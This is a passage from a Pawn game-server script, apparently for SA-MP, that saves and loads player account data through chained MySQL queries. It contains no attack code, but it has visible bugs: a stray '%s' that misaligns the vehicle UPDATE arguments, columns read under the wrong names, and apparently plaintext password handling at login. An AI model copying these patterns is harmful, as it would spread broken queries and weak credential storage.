			PlayerInfo[extraid][pJailTime], PlayerInfo[extraid][pGuns][0], PlayerInfo[extraid][pGuns][1], PlayerInfo[extraid][pGuns][2], PlayerInfo[extraid][pGuns][3], PlayerInfo[extraid][pGuns][4], PlayerInfo[extraid][pGuns][5], PlayerInfo[extraid][pGuns][6], PlayerInfo[extraid][pGuns][7],
			PlayerInfo[extraid][pGuns][8], PlayerInfo[extraid][pGuns][9], PlayerInfo[extraid][pGuns][10], PlayerInfo[extraid][pGuns][11], PlayerInfo[extraid][pPayCheck], PlayerInfo[extraid][pPayReady], PlayerInfo[extraid][pHospital], PlayerInfo[extraid][pDetSkill], PlayerInfo[extraid][pFishSkill],
			PlayerInfo[extraid][pLawSkill], PlayerInfo[extraid][pDrugsSkill], PlayerInfo[extraid][pSmugSkill], PlayerInfo[extraid][pArmsSkill], PlayerInfo[extraid][pMechSkill], PlayerInfo[extraid][pBoxSkill], PlayerInfo[extraid][pTruckSkill], PlayerInfo[extraid][pCarSkill], PlayerInfo[extraid][pLawyerTime],
			PlayerInfo[extraid][pLawyerFreeTime], PlayerInfo[extraid][pDrugsTime], PlayerInfo[extraid][pMechTime], PlayerInfo[extraid][pID]);

			mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_SAVE_ACCOUNT_CHAIN_3,extraid);
	    }
	    case THREAD_SAVE_ACCOUNT_CHAIN_3: {
			mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET SexTime = %d, CarTime = %d, Fishes = %d, BiggestFish = %d, pWEXists = %d, pWX = '%f', pWY = '%f', pWZ = '%f', pWVW = %d, pWInt = %d, pWValue = %d, pWSeeds = %d, Wins = %d, Loses = %d, \
			FightingStyle = %d, Screwdriver = %d, Wristwatch = %d, Tire = %d, Firstaid = %d, Rccam = %d, Receiver = %d, GPS = %d, Sweep = %d, SweepLeft = %d, Bugged = %d, OnDuty = %d, CarLic = %d, FlyLic = %d, GunLic = %d, Division = %d WHERE ID = %d",
			PlayerInfo[extraid][pSexTime], PlayerInfo[extraid][pCarTime], PlayerInfo[extraid][pFishes], PlayerInfo[extraid][pBiggestFish], PlayerInfo[extraid][pWeedObject], PlayerInfo[extraid][pWeedPos][0], PlayerInfo[extraid][pWeedPos][1], PlayerInfo[extraid][pWeedPos][2],
			PlayerInfo[extraid][pWeedVW], PlayerInfo[extraid][pWeedInt], PlayerInfo[extraid][pWeedGrowth], PlayerInfo[extraid][pWSeeds], PlayerInfo[extraid][pWins], PlayerInfo[extraid][pLoses], PlayerInfo[extraid][pFightStyle], PlayerInfo[extraid][pScrewdriver],
			PlayerInfo[extraid][pWristwatch], PlayerInfo[extraid][pTire], PlayerInfo[extraid][pFirstaid], PlayerInfo[extraid][pRccam], PlayerInfo[extraid][pReceiver], PlayerInfo[extraid][pGPS], PlayerInfo[extraid][pSweep], PlayerInfo[extraid][pSweepLeft],
			PlayerInfo[extraid][pBugged], PlayerInfo[extraid][pDuty], PlayerInfo[extraid][pCarLic], PlayerInfo[extraid][pFlyLic], PlayerInfo[extraid][pGunLic], PlayerInfo[extraid][pDivision], PlayerInfo[extraid][pID]);

			mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii",THREAD_SAVE_ACCOUNT_CHAIN_4,extraid);
	    }
	    case THREAD_SAVE_ACCOUNT_CHAIN_4: {
	        // Escape strings for now....
	        new
	            szPrisonedBy[MAX_PLAYER_NAME],
	            szPrisonReason[128],
	            szContractBy[MAX_PLAYER_NAME],
	            szContractDetail[128];

			mysql_escape_string(PlayerInfo[extraid][pPrisonedBy], szPrisonedBy,MAX_PLAYER_NAME,sqldb);
			mysql_escape_string(PlayerInfo[extraid][pPrisonReason], szPrisonReason,128,sqldb);

			mysql_escape_string(PlayerInfo[extraid][pContractBy], szContractBy,MAX_PLAYER_NAME,sqldb);
			mysql_escape_string(PlayerInfo[extraid][pContractDetail], szContractDetail,128,sqldb);

			mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET TicketTime = %d, HeadValue = %d, ContractBy = '%s', ContractDetail = '%s', Bombs = %d, CHits = %d, FHits = %d, PrisonedBy = '%s', PrisonReason = '%s', AcceptReport = %d, TrashReport = %d, Accent = %d, \
			NewMuted = %d, NewMutedTotal = %d, AdMuted = %d, AdMutedTotal = %d, ReportMuted = %d, ReportMutedTotal = %d, ReportMutedTime = %d, Speedo = %d, GCMuted = %d, GCMutedTime = %d, CallsAccepted = %d, PatientsDelivered = %d WHERE ID = %d",
			PlayerInfo[extraid][pTicketTime], PlayerInfo[extraid][pHeadValue], szContractBy, szContractDetail, PlayerInfo[extraid][pBombs], PlayerInfo[extraid][pCHits], PlayerInfo[extraid][pFHits], szPrisonedBy, szPrisonReason,
			PlayerInfo[extraid][pAcceptReport], PlayerInfo[extraid][pTrashReport], PlayerInfo[extraid][pAccent], PlayerInfo[extraid][pNMute], PlayerInfo[extraid][pNMuteTotal], PlayerInfo[extraid][pADMute], PlayerInfo[extraid][pADMuteTotal], PlayerInfo[extraid][pRMuted], PlayerInfo[extraid][pRMutedTotal],
			PlayerInfo[extraid][pRMutedTime], PlayerInfo[extraid][pSpeedo], PlayerInfo[extraid][pGCMuted], PlayerInfo[extraid][pGCMutedTime], PlayerInfo[extraid][pCallsAccepted], PlayerInfo[extraid][pPatientsDelivered], PlayerInfo[extraid][pID]);

			mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_SAVE_ACCOUNT_CHAIN_5,extraid);
	    }
	    case THREAD_SAVE_ACCOUNT_CHAIN_5: {
	        // Escape more strings...
	        new
	            szMarriedTo[MAX_PLAYER_NAME],
	            szFlag[128],
	            szReferredBy[MAX_PLAYER_NAME];

			mysql_escape_string(PlayerInfo[extraid][pMarriedTo], szMarriedTo,MAX_PLAYER_NAME,sqldb);
			mysql_escape_string(PlayerInfo[extraid][pFlag], szFlag,128,sqldb);
			mysql_escape_string(PlayerInfo[extraid][pReferredBy], szReferredBy,MAX_PLAYER_NAME,sqldb);

			mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE players SET SMSLog = %d, TriageTime = %d, Married = %d, MarriedTo = '%s', Flag = '%s', ReferredBy = '%s', RefTokens = %d, RefTokensOffline = %d, Helper = %d, GangMod = %d, LiveBanned = %d WHERE ID = %d",
			PlayerInfo[extraid][pSmslog], PlayerInfo[extraid][pTriageTime], PlayerInfo[extraid][pMarried], szMarriedTo, szFlag, szReferredBy, PlayerInfo[extraid][pRefTokens], PlayerInfo[extraid][pRefTokensOffline], PlayerInfo[extraid][pHelper],
			PlayerInfo[extraid][pGangMod], PlayerInfo[extraid][pLiveBanned], PlayerInfo[extraid][pID]);

			mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_SAVING_FINISHED,extraid);
		}
		case THREAD_SAVING_FINISHED: {
		    if(GetPVarInt(extraid, "attemptLoginAfter") == 1) { // Log the player back in if we need to (new registrations) and avoid saving things we know don't exist yet (i.e. toys)
                ResetPlayerVariables(extraid);
				AttemptPlayerLogin(extraid, PlayerInfo[extraid][pKey]);
            	DeletePVar(extraid, "attemptLoginAfter");
			} else {

				// Save player toys
				for(new v = 0; v < MAX_PLAYERTOYS; v++) {
				    if(PlayerToyInfo[extraid][v][ptRealID] >= 1) { // Check to ensure the toy has a real ID, in MySQL (if inserted it'll have a "real ID").
				        mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE toys SET ModelID = %d, Bone = %d, PosX = '%f', PosY = '%f', PosZ = '%f', RotX = '%f', RotY = '%f', RotZ = '%f', ScaX = '%f', ScaY = '%f', ScaZ = '%f' WHERE Owner = %d AND ID = %d",
						PlayerToyInfo[extraid][v][ptModelID], PlayerToyInfo[extraid][v][ptBone], PlayerToyInfo[extraid][v][ptPosX], PlayerToyInfo[extraid][v][ptPosY], PlayerToyInfo[extraid][v][ptPosZ], PlayerToyInfo[extraid][v][ptRotX], PlayerToyInfo[extraid][v][ptRotY], PlayerToyInfo[extraid][v][ptRotZ],
						PlayerToyInfo[extraid][v][ptScaleX], PlayerToyInfo[extraid][v][ptScaleY], PlayerToyInfo[extraid][v][ptScaleZ], PlayerInfo[extraid][pID], PlayerToyInfo[extraid][v][ptRealID]);

						mysql_tquery(sqldb,szQuery);
				    }
		   		}

		   		// Save player vehicles
				for(new v = 0; v < MAX_PLAYERVEHICLES; v++) {
				    if(PlayerVehicleInfo[extraid][v][pvRealID] >= 1) { // Check to ensure the vehicle has a real ID, in MySQL (if inserted, it'll have a "real ID").
				        mysql_format(sqldb,szQuery, sizeof(szQuery), "UPDATE playervehicles SET PosX = '%f', PosY = '%f', PosZ = '%f', PosAngle = '%f', ModelID = %d, LockType = %d, Locked = %d, PaintJob = %d, Color1 = %d, Color2 = %d, \
						Price = %d, Ticket = %d, Weapon0 = %d, Weapon1 = %d, Weapon2 = %d, WepUpgrade = %d, Impound = %d, Spawned = %d, Disabled = %d, NumPlate = '%s', Mod0 = %d, Mod1 = %d, Mod2 = %d,%s Mod3 = %d, Mod4 = %d, Mod5 = %d, Mod6 = %d, Mod7 = %d, Mod8 = %d, Mod9 = %d, Mod10 = %d, Mod11 = %d, Mod12 = %d, Mod13 = %d, Mod14 = %d WHERE Owner = %d AND ID = %d",
						PlayerVehicleInfo[extraid][v][pvPosX], PlayerVehicleInfo[extraid][v][pvPosY], PlayerVehicleInfo[extraid][v][pvPosZ], PlayerVehicleInfo[extraid][v][pvPosAngle], PlayerVehicleInfo[extraid][v][pvModelId], PlayerVehicleInfo[extraid][v][pvLock], PlayerVehicleInfo[extraid][v][pvLocked], PlayerVehicleInfo[extraid][v][pvPaintJob],
						PlayerVehicleInfo[extraid][v][pvColor1], PlayerVehicleInfo[extraid][v][pvColor2], PlayerVehicleInfo[extraid][v][pvPrice], PlayerVehicleInfo[extraid][v][pvTicket], PlayerVehicleInfo[extraid][v][pvWeapons][0], PlayerVehicleInfo[extraid][v][pvWeapons][1], PlayerVehicleInfo[extraid][v][pvWeapons][2],
						PlayerVehicleInfo[extraid][v][pvWepUpgrade], PlayerVehicleInfo[extraid][v][pvImpounded], PlayerVehicleInfo[extraid][v][pvSpawned], PlayerVehicleInfo[extraid][v][pvDisabled], PlayerVehicleInfo[extraid][v][pvNumberPlate], PlayerVehicleInfo[extraid][v][pvMods][0], PlayerVehicleInfo[extraid][v][pvMods][1], PlayerVehicleInfo[extraid][v][pvMods][2],
						PlayerVehicleInfo[extraid][v][pvMods][3], PlayerVehicleInfo[extraid][v][pvMods][4], PlayerVehicleInfo[extraid][v][pvMods][5],PlayerVehicleInfo[extraid][v][pvMods][6], PlayerVehicleInfo[extraid][v][pvMods][7], PlayerVehicleInfo[extraid][v][pvMods][8], PlayerVehicleInfo[extraid][v][pvMods][9], PlayerVehicleInfo[extraid][v][pvMods][10],
						PlayerVehicleInfo[extraid][v][pvMods][11], PlayerVehicleInfo[extraid][v][pvMods][12],PlayerVehicleInfo[extraid][v][pvMods][13], PlayerVehicleInfo[extraid][v][pvMods][14], PlayerInfo[extraid][pID], PlayerVehicleInfo[extraid][v][pvRealID]);

						/* Concencating the string seems like the most appropriate method for this type... Don't wanna send more than 1 query per player vehicle.
						format(szQuery, sizeof(szQuery), "%s Mod3 = %d, Mod4 = %d, Mod5 = %d, Mod6 = %d, Mod7 = %d, Mod8 = %d, Mod9 = %d, Mod10 = %d, Mod11 = %d, Mod12 = %d, Mod13 = %d, Mod14 = %d WHERE Owner = %d AND ID = %d", szQuery, PlayerVehicleInfo[extraid][v][pvMods][3], PlayerVehicleInfo[extraid][v][pvMods][4], PlayerVehicleInfo[extraid][v][pvMods][5],
						PlayerVehicleInfo[extraid][v][pvMods][6], PlayerVehicleInfo[extraid][v][pvMods][7], PlayerVehicleInfo[extraid][v][pvMods][8], PlayerVehicleInfo[extraid][v][pvMods][9], PlayerVehicleInfo[extraid][v][pvMods][10], PlayerVehicleInfo[extraid][v][pvMods][11], PlayerVehicleInfo[extraid][v][pvMods][12],
						PlayerVehicleInfo[extraid][v][pvMods][13], PlayerVehicleInfo[extraid][v][pvMods][14], PlayerInfo[extraid][pID], PlayerVehicleInfo[extraid][v][pvRealID]);
						*/
						// Submit the huge query...
						mysql_tquery(sqldb,szQuery);
				    }
		   		}
            }
		}
	    case THREAD_REGISTER_ACCOUNT: {
			ResetPlayerVariables(extraid);

			gPlayerLogged[extraid] = 1;
			// PlayerInfo[extraid][pID] = mysql_insert_id(sqldb);
			PlayerInfo[extraid][pReg] = 1;
			GetPVarString(extraid, "password", PlayerInfo[extraid][pKey], 128);
			DeletePVar(extraid, "password");

			SetPVarInt(extraid, "attemptLoginAfter", 1);
			SaveAccount(extraid);


			TotalRegister++;
		}
		case THREAD_LOGIN_ATTEMPT: {
		    // mysql_free_result(sqldb);

			if(IsPlayerConnected(extraid)) {
			    new
			        szReturn[128],
				    string[128];

		        if(cache_num_rows() == 0) { // No rows exist with the specified criteria, so, wrong password!
		            // mysql_free_result(sqldb);
					ShowMainMenuDialog(extraid, 3);

					gPlayerLogTries[extraid]++;
		        } else {
		            // mysql_retrieve_row();

					// Decided against using sscanf as I'd have to create a variable the size of mars. Old school method it is...
					cache_get_value_name(0, "ID",szReturn);
					PlayerInfo[extraid][pID] = strval(szReturn);

					cache_get_value_name(0, "Password",PlayerInfo[extraid][pKey]);

					cache_get_value_name(0, "Level",szReturn);
					PlayerInfo[extraid][pLevel] = strval(szReturn);

					cache_get_value_name(0, "AdminLevel",szReturn);
					PlayerInfo[extraid][pAdmin] = strval(szReturn);

					cache_get_value_name(0, "AdminName",PlayerInfo[extraid][pAdminName]);

					cache_get_value_name(0, "BanAppealer",szReturn);
					PlayerInfo[extraid][pBanAppealer] = strval(szReturn);

					cache_get_value_name(0, "Donator",szReturn);
					PlayerInfo[extraid][pVip] = strval(szReturn);

					cache_get_value_name(0, "Banned",szReturn);
					PlayerInfo[extraid][pBanned] = strval(szReturn);

					cache_get_value_name(0, "Permabanned",szReturn);
					PlayerInfo[extraid][pPermaBanned] = strval(szReturn);

					cache_get_value_name(0, "Disabled",szReturn);
					PlayerInfo[extraid][pDisabled] = strval(szReturn);

					cache_get_value_name(0, "LastIP",PlayerInfo[extraid][pIP]);

					cache_get_value_name(0, "Registered",szReturn);
					PlayerInfo[extraid][pReg] = strval(szReturn);

					cache_get_value_name(0, "Tutorial",szReturn);
					PlayerInfo[extraid][pTut] = strval(szReturn);

					cache_get_value_name(0, "Sex",szReturn);
					PlayerInfo[extraid][pSex] = strval(szReturn);

					cache_get_value_name(0, "Age",szReturn);
					PlayerInfo[extraid][pAge] = strval(szReturn);

					cache_get_value_name(0, "Skin",szReturn);
					PlayerInfo[extraid][pSkin] = strval(szReturn);

					cache_get_value_name(0, "PosX",szReturn);
					PlayerInfo[extraid][pPos_x] = floatstr(szReturn);
					SetPVarFloat(extraid, "realX", floatstr(szReturn));

					cache_get_value_name(0, "PosY",szReturn);
					PlayerInfo[extraid][pPos_y] = floatstr(szReturn);
					SetPVarFloat(extraid, "realY", floatstr(szReturn));

					cache_get_value_name(0, "PosZ",szReturn);
					PlayerInfo[extraid][pPos_z] = floatstr(szReturn);
					SetPVarFloat(extraid, "realZ", floatstr(szReturn));

					cache_get_value_name(0, "PosR",szReturn);
					PlayerInfo[extraid][pPos_r] = floatstr(szReturn);

					cache_get_value_name(0, "ConnectTime",szReturn);
					PlayerInfo[extraid][pConnectTime] = strval(szReturn);

					cache_get_value_name(0, "Respect",szReturn);
					PlayerInfo[extraid][pRespect] = strval(szReturn);

					cache_get_value_name(0, "PhoneNumber",szReturn);
					PlayerInfo[extraid][pNumber] = strval(szReturn);

					cache_get_value_name(0, "Warnings",szReturn);
					PlayerInfo[extraid][pWarns] = strval(szReturn);

					cache_get_value_name(0, "Gang",szReturn);
					PlayerInfo[extraid][pGang] = strval(szReturn);

					cache_get_value_name(0, "Faction",szReturn);
					PlayerInfo[extraid][pFaction] = strval(szReturn);

					cache_get_value_name(0, "Leader",szReturn);
					PlayerInfo[extraid][pLeader] = strval(szReturn);

					cache_get_value_name(0, "Rankk",szReturn);
					PlayerInfo[extraid][pRank] = strval(szReturn);

					cache_get_value_name(0, "Job",szReturn);
					PlayerInfo[extraid][pJob] = strval(szReturn);

					cache_get_value_name(0, "Job2",szReturn);
					PlayerInfo[extraid][pJob2] = strval(szReturn);

					cache_get_value_name(0, "UpgradePoints",szReturn);
					PlayerInfo[extraid][gPupgrade] = strval(szReturn);

					cache_get_value_name(0, "SpawnArmor",szReturn);
					PlayerInfo[extraid][pSarmor] = strval(szReturn);

					cache_get_value_name(0, "Cash",szReturn);
					PlayerInfo[extraid][pCash] = strval(szReturn);

					cache_get_value_name(0, "Bank",szReturn);
					PlayerInfo[extraid][pBank] = strval(szReturn);

					cache_get_value_name(0, "Insurance",szReturn);
					PlayerInfo[extraid][pInsurance] = strval(szReturn);

					cache_get_value_name(0, "Smslog",szReturn);
					PlayerInfo[extraid][pSmslog] = strval(szReturn);

					cache_get_value_name(0, "Crimes",szReturn);
					PlayerInfo[extraid][pCrimes] = strval(szReturn);

					cache_get_value_name(0, "Arrested",szReturn);
					PlayerInfo[extraid][pArrested] = strval(szReturn);

					cache_get_value_name(0, "WantedLevel",szReturn);
					PlayerInfo[extraid][pWantedLevel] = strval(szReturn);

					cache_get_value_name(0, "Health",szReturn);
					PlayerInfo[extraid][pHealth] = floatstr(szReturn);

					cache_get_value_name(0, "Armor",szReturn);
					PlayerInfo[extraid][pArmor] = floatstr(szReturn);

					cache_get_value_name(0, "Pot",szReturn);
					PlayerInfo[extraid][pPot] = strval(szReturn);

					cache_get_value_name(0, "Crack",szReturn);
					PlayerInfo[extraid][pCrack] = strval(szReturn);

					cache_get_value_name(0, "Radio",szReturn);
					PlayerInfo[extraid][pRadio] = strval(szReturn);

					cache_get_value_name(0, "RadioFreq",szReturn);
					PlayerInfo[extraid][pRadioFreq] = strval(szReturn);

					cache_get_value_name(0, "Phonebook",szReturn);
					PlayerInfo[extraid][pPhoneBook] = strval(szReturn);

					cache_get_value_name(0, "Dice",szReturn);
					PlayerInfo[extraid][pDice] = strval(szReturn);

					cache_get_value_name(0, "CDPlayer",szReturn);
					PlayerInfo[extraid][pCDPlayer] = strval(szReturn);

					cache_get_value_name(0, "Materials",szReturn);
					PlayerInfo[extraid][pMats] = strval(szReturn);

					cache_get_value_name(0, "Rope",szReturn);
					PlayerInfo[extraid][pRope] = strval(szReturn);

					cache_get_value_name(0, "Cigars",szReturn);
					PlayerInfo[extraid][pCigar] = strval(szReturn);

					cache_get_value_name(0, "Sprunk",szReturn);
					PlayerInfo[extraid][pSprunk] = strval(szReturn);

					cache_get_value_name(0, "Spraycan",szReturn);
					PlayerInfo[extraid][pSpraycan] = strval(szReturn);

					cache_get_value_name(0, "House",szReturn);
					PlayerInfo[extraid][pHouse] = strval(szReturn);

					cache_get_value_name(0, "House2",szReturn);
					PlayerInfo[extraid][pHouse2] = strval(szReturn);

					cache_get_value_name(0, "Renting",szReturn);
					PlayerInfo[extraid][pRenting] = strval(szReturn);

					cache_get_value_name(0, "Interior",szReturn);
					PlayerInfo[extraid][pInt] = strval(szReturn);

					cache_get_value_name(0, "VirtualWorld",szReturn);
					PlayerInfo[extraid][pVW] = strval(szReturn);

					cache_get_value_name(0, "Jailed",szReturn);
					PlayerInfo[extraid][pJailed] = strval(szReturn);

					cache_get_value_name(0, "JailTime",szReturn);
					PlayerInfo[extraid][pJailTime] = strval(szReturn);

					cache_get_value_name(0, "Gun0",szReturn);
					PlayerInfo[extraid][pGuns][0] = strval(szReturn);

					cache_get_value_name(0, "Gun1",szReturn);
					PlayerInfo[extraid][pGuns][1] = strval(szReturn);

					cache_get_value_name(0, "Gun2",szReturn);
					PlayerInfo[extraid][pGuns][2] = strval(szReturn);

					cache_get_value_name(0, "Gun3",szReturn);
					PlayerInfo[extraid][pGuns][3] = strval(szReturn);

					cache_get_value_name(0, "Gun4",szReturn);
					PlayerInfo[extraid][pGuns][4] = strval(szReturn);

					cache_get_value_name(0, "Gun5",szReturn);
					PlayerInfo[extraid][pGuns][5] = strval(szReturn);

					cache_get_value_name(0, "Gun6",szReturn);
					PlayerInfo[extraid][pGuns][6] = strval(szReturn);

					cache_get_value_name(0, "Gun7",szReturn);
					PlayerInfo[extraid][pGuns][7] = strval(szReturn);

					cache_get_value_name(0, "Gun8",szReturn);
					PlayerInfo[extraid][pGuns][8] = strval(szReturn);

					cache_get_value_name(0, "Gun9",szReturn);
					PlayerInfo[extraid][pGuns][9] = strval(szReturn);

					cache_get_value_name(0, "Gun10",szReturn);
					PlayerInfo[extraid][pGuns][10] = strval(szReturn);

					cache_get_value_name(0, "Gun11",szReturn);
					PlayerInfo[extraid][pGuns][11] = strval(szReturn);

					cache_get_value_name(0, "Paycheck",szReturn);
					PlayerInfo[extraid][pPayCheck] = strval(szReturn);

					cache_get_value_name(0, "PayReady",szReturn);
					PlayerInfo[extraid][pPayReady] = strval(szReturn);

					cache_get_value_name(0, "Hospital",szReturn);
					PlayerInfo[extraid][pHospital] = strval(szReturn);

					cache_get_value_name(0, "DetSkill",szReturn);
					PlayerInfo[extraid][pDetSkill] = strval(szReturn);

					cache_get_value_name(0, "LawSkill",szReturn);
					PlayerInfo[extraid][pLawSkill] = strval(szReturn);

					cache_get_value_name(0, "SexSkill",szReturn);
					PlayerInfo[extraid][pSexSkill] = strval(szReturn);

					cache_get_value_name(0, "DrugsSkill",szReturn);
					PlayerInfo[extraid][pDrugsSkill] = strval(szReturn);

					cache_get_value_name(0, "SmugglerSkill",szReturn);
					PlayerInfo[extraid][pSmugSkill] = strval(szReturn);

					cache_get_value_name(0, "ArmsSkill",szReturn);
					PlayerInfo[extraid][pArmsSkill] = strval(szReturn);

					cache_get_value_name(0, "MechSkill",szReturn);
					PlayerInfo[extraid][pMechSkill] = strval(szReturn);

					cache_get_value_name(0, "FishSkill",szReturn);
					PlayerInfo[extraid][pFishSkill] = strval(szReturn);

					cache_get_value_name(0, "BoxSkill",szReturn);
					PlayerInfo[extraid][pBoxSkill] = strval(szReturn);

					cache_get_value_name(0, "TruckSkill",szReturn);
					PlayerInfo[extraid][pTruckSkill] = strval(szReturn);

					cache_get_value_name(0, "CarSkill",szReturn);
					PlayerInfo[extraid][pCarSkill] = strval(szReturn);

					cache_get_value_name(0, "LawyerTime",szReturn);
					PlayerInfo[extraid][pLawyerTime] = strval(szReturn);

					cache_get_value_name(0, "LawyerFreeTime",szReturn);
					PlayerInfo[extraid][pLawyerFreeTime] = strval(szReturn);

					cache_get_value_name(0, "DrugsTime",szReturn);
					PlayerInfo[extraid][pDrugsTime] = strval(szReturn);

					cache_get_value_name(0, "MechTime",szReturn);
					PlayerInfo[extraid][pMechTime] = strval(szReturn);

					cache_get_value_name(0, "SexTime",szReturn);
					PlayerInfo[extraid][pSexTime] = strval(szReturn);

					cache_get_value_name(0, "CarTime",szReturn);
					PlayerInfo[extraid][pCarTime] = strval(szReturn);

					cache_get_value_name(0, "Fishes",szReturn);
					PlayerInfo[extraid][pFishes] = strval(szReturn);

					cache_get_value_name(0, "BiggestFish",szReturn);
					PlayerInfo[extraid][pBiggestFish] = strval(szReturn);

					cache_get_value_name(0, "pWEXists",szReturn);
					PlayerInfo[extraid][pWeedObject] = strval(szReturn);

					cache_get_value_name(0, "pWX",szReturn);
					PlayerInfo[extraid][pWeedPos][0] = floatstr(szReturn);

					cache_get_value_name(0, "pWY",szReturn);
					PlayerInfo[extraid][pWeedPos][1] = floatstr(szReturn);

					cache_get_value_name(0, "pWZ",szReturn);
					PlayerInfo[extraid][pWeedPos][2] = floatstr(szReturn);

					cache_get_value_name(0, "pWVW",szReturn);
					PlayerInfo[extraid][pWeedVW] = strval(szReturn);

					cache_get_value_name(0, "pWInt",szReturn);
					PlayerInfo[extraid][pWeedInt] = strval(szReturn);

					cache_get_value_name(0, "pWValue",szReturn);
					PlayerInfo[extraid][pWeedGrowth] = strval(szReturn);

					cache_get_value_name(0, "pWSeeds",szReturn);
					PlayerInfo[extraid][pWSeeds] = strval(szReturn);

					cache_get_value_name(0, "Wins",szReturn);
					PlayerInfo[extraid][pWins] = strval(szReturn);

					cache_get_value_name(0, "Loses",szReturn);
					PlayerInfo[extraid][pLoses] = strval(szReturn);

					cache_get_value_name(0, "FightingStyle",szReturn);
					PlayerInfo[extraid][pFightStyle] = strval(szReturn);

					cache_get_value_name(0, "Screwdriver",szReturn);
					PlayerInfo[extraid][pScrewdriver] = strval(szReturn);

					cache_get_value_name(0, "Wristwatch",szReturn);
					PlayerInfo[extraid][pWristwatch] = strval(szReturn);

					cache_get_value_name(0, "Tire",szReturn);
					PlayerInfo[extraid][pTire] = strval(szReturn);

					cache_get_value_name(0, "Firstaid",szReturn);
					PlayerInfo[extraid][pFirstaid] = strval(szReturn);

					cache_get_value_name(0, "Rccam",szReturn);
					PlayerInfo[extraid][pRccam] = strval(szReturn);

					cache_get_value_name(0, "Receiver",szReturn);
					PlayerInfo[extraid][pReceiver] = strval(szReturn);

					cache_get_value_name(0, "GPS",szReturn);
					PlayerInfo[extraid][pGPS] = strval(szReturn);

					cache_get_value_name(0, "Sweep",szReturn);
					PlayerInfo[extraid][pSweep] = strval(szReturn);

					cache_get_value_name(0, "SweepLeft",szReturn);
					PlayerInfo[extraid][pSweepLeft] = strval(szReturn);

					cache_get_value_name(0, "Bugged",szReturn);
					PlayerInfo[extraid][pBugged] = strval(szReturn);

					cache_get_value_name(0, "CarLic",szReturn);
					PlayerInfo[extraid][pCarLic] = strval(szReturn);

					cache_get_value_name(0, "FlyLic",szReturn);
					PlayerInfo[extraid][pFlyLic] = strval(szReturn);

					cache_get_value_name(0, "BoatLic",szReturn);
					PlayerInfo[extraid][pBoatLic] = strval(szReturn);

					cache_get_value_name(0, "FishLic",szReturn);
					PlayerInfo[extraid][pFishLic] = strval(szReturn);

					cache_get_value_name(0, "GunLic",szReturn);
					PlayerInfo[extraid][pGunLic] = strval(szReturn);

					cache_get_value_name(0, "Division",szReturn);
					PlayerInfo[extraid][pDivision] = strval(szReturn);

					cache_get_value_name(0, "TicketTime",szReturn);
					PlayerInfo[extraid][pTicketTime] = strval(szReturn);

					cache_get_value_name(0, "HeadValue",szReturn);
					PlayerInfo[extraid][pHeadValue] = strval(szReturn);

					cache_get_value_name(0, "ContractBy",PlayerInfo[extraid][pContractBy]);

		            cache_get_value_name(0, "ContractBy",PlayerInfo[extraid][pContractDetail]);

					cache_get_value_name(0, "Bombs",szReturn);
					PlayerInfo[extraid][pBombs] = strval(szReturn);

					cache_get_value_name(0, "CHits",szReturn);
					PlayerInfo[extraid][pCHits] = strval(szReturn);

					cache_get_value_name(0, "FHits",szReturn);
					PlayerInfo[extraid][pFHits] = strval(szReturn);

					cache_get_value_name(0, "PrisonedBy",PlayerInfo[extraid][pPrisonedBy]);

					cache_get_value_name(0, "PrisonReason",PlayerInfo[extraid][pPrisonReason]);

					cache_get_value_name(0, "AcceptReport",szReturn);
					PlayerInfo[extraid][pAcceptReport] = strval(szReturn);

					cache_get_value_name(0, "TrashReport",szReturn);
					PlayerInfo[extraid][pTrashReport] = strval(szReturn);

					cache_get_value_name(0, "Accent",szReturn);
					PlayerInfo[extraid][pAccent] = strval(szReturn);

					cache_get_value_name(0, "NewMuted",szReturn);
					PlayerInfo[extraid][pNMute] = strval(szReturn);

					cache_get_value_name(0, "NewMutedTotal",szReturn);
					PlayerInfo[extraid][pNMuteTotal] = strval(szReturn);

					cache_get_value_name(0, "AdMuted",szReturn);
					PlayerInfo[extraid][pADMute] = strval(szReturn);

					cache_get_value_name(0, "AdMutedTotal",szReturn);
					PlayerInfo[extraid][pADMuteTotal] = strval(szReturn);

					cache_get_value_name(0, "ReportMuted",szReturn);
					PlayerInfo[extraid][pRMuted] = strval(szReturn);

					cache_get_value_name(0, "ReportMutedTotal",szReturn);
					PlayerInfo[extraid][pRMutedTotal] = strval(szReturn);

					cache_get_value_name(0, "ReportMutedTime",szReturn);
					PlayerInfo[extraid][pRMutedTime] = strval(szReturn);

					cache_get_value_name(0, "Speedo",szReturn);
					PlayerInfo[extraid][pSpeedo] = strval(szReturn);

					cache_get_value_name(0, "GCMuted",szReturn);
					PlayerInfo[extraid][pGCMuted] = strval(szReturn);

					cache_get_value_name(0, "GCMutedTime",szReturn);
					PlayerInfo[extraid][pGCMutedTime] = strval(szReturn);

					cache_get_value_name(0, "CallsAccepted",szReturn);
					PlayerInfo[extraid][pCallsAccepted] = strval(szReturn);

					cache_get_value_name(0, "PatientsDelivered",szReturn);
					PlayerInfo[extraid][pPatientsDelivered] = strval(szReturn);

					cache_get_value_name(0, "TriageTime",szReturn);
					PlayerInfo[extraid][pTriageTime] = strval(szReturn);

					cache_get_value_name(0, "Married",szReturn);
					PlayerInfo[extraid][pMarried] = strval(szReturn);

					cache_get_value_name(0, "MarriedTo",PlayerInfo[extraid][pMarriedTo]);

					cache_get_value_name(0, "OnDuty",szReturn);
					PlayerInfo[extraid][pDuty] = strval(szReturn);

					cache_get_value_name(0, "Flag",PlayerInfo[extraid][pFlag]);

					cache_get_value_name(0, "ReferredBy",PlayerInfo[extraid][pReferredBy]);

					cache_get_value_name(0, "ReferredBy",szReturn);
					PlayerInfo[extraid][pRefTokens] = strval(szReturn);

					cache_get_value_name(0, "RefTokens",szReturn);
					PlayerInfo[extraid][pRefTokens] = strval(szReturn);

					cache_get_value_name(0, "RefTokensOffline",szReturn);
					PlayerInfo[extraid][pRefTokensOffline] = strval(szReturn);

					cache_get_value_name(0, "Helper",szReturn);
					PlayerInfo[extraid][pHelper] = strval(szReturn);

					cache_get_value_name(0, "GangMod",szReturn);
					PlayerInfo[extraid][pGangMod] = strval(szReturn);

					cache_get_value_name(0, "LiveBanned",szReturn);
